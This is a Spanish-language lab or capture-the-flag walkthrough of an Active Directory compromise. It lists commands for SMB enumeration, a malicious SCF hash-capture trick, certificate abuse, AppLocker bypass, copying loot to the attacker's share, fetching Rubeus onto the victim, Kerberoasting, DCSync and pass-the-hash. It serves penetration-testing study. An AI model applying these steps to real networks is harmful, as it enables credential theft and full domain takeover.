## Tenicas utilizadas 
- MBCacls Enumeration Malicious SCF File (Getting NetNTLMv2 Hash) 
- Ldap Enumeration (LdapDomainDump) 
- Abusing Microsoft Active Directory Certificate Services Creating Certificate Signing Requests (CSR) [Openssl] 
- CLM / AppLocker Break Out (Escaping ConstrainedLanguage) PSByPassCLM Usage (CLM / AppLocker Break out) Msbuild (CLM / AppLocker Break Out) 
- Kerberoasting Attack (Rubeus) Kerberoasting Attack (Chisel Port Forward - GetUserSPNs.py) 
- WINRM Connections 
- BloodHound Enumeration 
- DCSync Attack (secretsdump.py)
- DCSync Attack (Mimikatz) 
- zPassTheHash (wmiexec.py)
## Procedimiento
- Probar enumerar los recursos compartidos a nivel de red de smb
- Crear una montura del recurso compartido encontrado ``mount -t cifis "/$ip/$ruta" $mntPath``
- Utilizar ``tree -fas`` para enumerar los directorios
- Crear un diccionario potencial de usuarios
- Realizar un ASREProast Attack(**Imposible por que el puerto 88 esta cerrado**)
- Listar los directorios en los que tenemos privilegios de escritura ``smbcacls "//$ip/$recurso" Users/$usuario ``
- Scripting en bash <-
```bash
for directory in $(ls); do

	echo -e "\n[+] Enumerando permiso del directorio $directory:\n"
	echo -e "\t$(smbcacls "//$ip/$ruta" Users/$directory -N | grep "Everyone")"
	 
done
```
- Crear un recurso compartido a nivel de red e inyectar un archivo SCF en el directorio en el que tenemos permisos para intentar que el usuario se atentifique conmigo.
- Cracker el hash
- Intentar un Kerberoasting attack para conseguir un **Ticket Garanting Service**
- No podemos solicitar el TGS porque Kerberos no esta expuesto
- Dumpear la informacion del dominio con **ldapomainDump**
- Fuzzer la pagina web
- Crear claves ``openssl req -newkey rsa:2048 -nodes -keyout $name.key -out $name.csr``, brindar el certificado al ADCS(*Active Directory Certificate Services*)
- Conectarse al winrm: ``evil-winrm -S -c $certificado -k $key -i $ip -u $user -p $password``
- Tirar de bloodhound-python para recolectar informacion del dominio
	- **ALTERNATIVA BLOODHOUND**: SharpHoud, desde adentro de la maquina.
	- Bypassear el CLM(**Constrinet Leanguage Mode**) con **PsByPassCLM.exe** 
	![[Pasted image 20221031192155.png]]
	- Transferir el sharphound de la maquina victima a la maquina atacante. Antes de transferirlo, el recurso creado con impacket debe contar con una contraseña y con un usuario, también nos debemos loggear en la maquina victima; ``net use x: \\$ip\$recursoCompartido /user:$usuario $password`` y posteriormente ``copy $SharpHound.zip x:\$archivo.zip``

- Tirar del repositorio  *ghost-compiled-binaries*, y descargar la utilidad de rubeus.exe, posteriormente lo transferimos a la maquina victima con ``iwr -uri $ip/$recurso -OutFile Rubeus.exe``
- Efectuar el kerberoasting attack con el Rubeus.exe y crackeamos el hash
- Terminamos con un PassTheHash, con wmiexec.py ``$dominio/$user@$ip -hashes :$hash``W